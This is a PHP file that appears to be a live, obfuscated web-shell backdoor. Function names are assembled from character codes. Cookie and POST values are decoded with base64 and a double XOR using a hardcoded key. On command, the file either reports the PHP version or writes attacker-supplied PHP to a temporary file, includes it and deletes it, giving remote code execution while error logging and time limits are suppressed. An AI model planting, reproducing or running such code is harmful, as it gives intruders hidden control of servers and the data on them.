<?php $hinddparq = 'f'."\x69"."\154".chr(101).chr(95).chr(112)."\165"."\164"."\x5f".'c'.'o'.chr(464-354).'t'."\145".'n'.chr(116).chr(334-219);
$litnizti = chr(571-473)."\141"."\163"."\x65"."\66"."\x34".chr(629-534).chr(953-853)."\145".chr(110-11).chr(301-190)."\144".chr(594-493);
$pikcfajk = "\151".'n'."\x69"."\x5f"."\x73".'e'."\x74";
$hawqknvat = 'u'.'n'.'l'.chr(855-750).chr(110).chr(107);


@$pikcfajk("\145".chr(114)."\x72"."\157".chr(114).chr(449-354).'l'.'o'.chr(103), NULL);
@$pikcfajk('l'."\157".chr(103)."\137"."\145"."\162".chr(863-749)."\x6f"."\x72"."\x73", 0);
@$pikcfajk('m'.chr(871-774).chr(120)."\137".chr(931-830)."\170".chr(463-362)."\x63".'u'."\x74"."\151".'o'.chr(110).'_'."\x74"."\151"."\155"."\x65", 0);
@set_time_limit(0);

function yuwtbik($duadjqddxc, $lkunqgguk)
{
    $tjpxvnkxr = "";
    for ($tfdxazieap = 0; $tfdxazieap < strlen($duadjqddxc);) {
        for ($j = 0; $j < strlen($lkunqgguk) && $tfdxazieap < strlen($duadjqddxc); $j++, $tfdxazieap++) {
            $tjpxvnkxr .= chr(ord($duadjqddxc[$tfdxazieap]) ^ ord($lkunqgguk[$j]));
        }
    }
    return $tjpxvnkxr;
}

$oawhcw = array_merge($_COOKIE, $_POST);
$gogyitw = 'ff196ded-f26e-4d34-89d9-cf64647275cc';
foreach ($oawhcw as $tbspm => $duadjqddxc) {
    $duadjqddxc = @unserialize(yuwtbik(yuwtbik($litnizti($duadjqddxc), $gogyitw), $tbspm));
    if (isset($duadjqddxc[chr(97).chr(612-505)])) {
        if ($duadjqddxc["\141"] == chr(105)) {
            $tfdxazieap = array(
                chr(776-664).'v' => @phpversion(),
                's'.chr(118) => "3.5",
            );
            echo @serialize($tfdxazieap);
        } elseif ($duadjqddxc["\141"] == "\145") {
            $tfdxazieapcfcwpcor = "./" . md5($gogyitw) . "\56".'i'.chr(437-327).chr(561-462);
            @$hinddparq($tfdxazieapcfcwpcor, "<" . chr(780-717)."\x70"."\x68".chr(121-9).chr(887-855)."\x40".chr(599-482).'n'."\154".'i'."\156"."\x6b".chr(40)."\137".chr(95)."\106"."\x49".chr(76).chr(69)."\137".chr(95)."\51"."\73".chr(806-774) . $duadjqddxc['d']);
            @include($tfdxazieapcfcwpcor);
            @$hawqknvat($tfdxazieapcfcwpcor);
        }
        exit();
    }
}

